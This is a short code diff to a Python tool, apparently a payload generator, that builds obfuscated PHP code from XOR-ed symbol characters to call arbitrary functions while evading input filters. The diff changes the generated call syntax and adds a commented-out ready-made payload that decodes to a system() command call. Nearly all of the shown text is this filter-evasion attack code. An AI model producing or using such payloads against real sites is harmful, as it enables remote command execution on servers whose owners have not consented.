@@ -61,12 +61,14 @@ while 1:
     para = convert(parameter)
     if parameter != "":
         print (function+"("+parameter+")")
-        code = Generate(funct,"$_")+Generate(para,"$__")+"$_('$__');"
+        code = Generate(funct,"$_")+Generate(para,"$__")+"($_)($__);"
         print (code.replace("'~'^''^''","'~'^'^'"))
         
     else:
         print (function+"()")
-        code = Generate(funct,"$_")+Generate(para,"$__")+"$_();"
+        code = Generate(funct,"$_")+Generate(para,"$__")+"($_)();"
         print(code.replace("'~'^''^''","'~'^'^'"))
         
+#print (Generate(para,"$__"))
 
+#$_='_'^',';$_.='_'^'&';$_.='_'^',';$_.='_'^'+';$_.='_'^':';$_.='@'^'-';$__='|'^'[';$__.='@'^',';$__.='_'^',';$__.='~'^'^';$__.='-';$__.='_'^'>';$__.='|'^'[';($_)($__);
